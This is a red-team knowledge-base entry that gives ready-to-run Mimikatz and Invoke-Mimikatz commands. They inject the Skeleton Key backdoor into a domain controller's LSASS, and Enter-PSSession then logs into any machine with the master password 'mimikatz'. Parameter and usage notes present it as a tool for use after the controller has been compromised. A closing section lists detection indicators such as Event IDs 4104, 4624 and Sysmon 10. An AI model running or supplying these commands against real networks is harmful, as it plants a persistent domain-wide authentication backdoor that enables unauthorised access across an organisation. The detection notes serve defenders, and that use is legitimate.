---
id: 2c0fb41c-e4ab-4990-b3e8-6a6834de6cac
name: PowerShell-Skeleton-Key-Implementation
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:28.268749+00:00'
updated_at: '2023-10-10T20:37:25.394168+00:00'
platforms:
  - Windows
tags:
  - persistence
  - skeleton-key
  - mimikatz
validated: true
---

# PowerShell-Skeleton-Key-Implementation

## Code

```powershell
# Execute the skeleton key attack
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

## Description

This PowerShell script implements the Skeleton Key backdoor on a domain controller either locally or remotely using Invoke-Mimikatz, then demonstrates accessing a target machine with the backdoor password. It combines execution and verification in one snippet for persistence establishment.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `<DCs FQDN>` | Fully qualified domain name of the domain controller | `dc01.contoso.com` |
| `<AnyMachineYouLike>` | FQDN or hostname of the target machine to access | `workstation01.contoso.com` |
| `<Domain>` | NetBIOS domain name | `CONTOSO` |

## Usage

Run this script from an administrative PowerShell session with access to the domain controller. First, execute the Mimikatz parts to inject the backdoor, then use the Enter-PSSession to test access. Requires the Mimikatz PowerShell module (Invoke-Mimikatz) for remote execution. Ideal for red team operations after initial DC compromise.

## Detection

- PowerShell execution logs (Module Logging, Script Block Logging) showing Mimikatz commands or Invoke-Mimikatz.
- Event ID 4104 in PowerShell logs with "skeleton" keywords.
- Unusual successful logons (Event ID 4624) with the authentication package "NTLM" and password attempts matching "mimikatz".
- LSASS process anomalies via Sysmon Event ID 10 (process access) targeting lsass.exe.

## Related

- [[procedures/Skeleton-Key-Persistence]]
- [[tools/Mimikatz]]
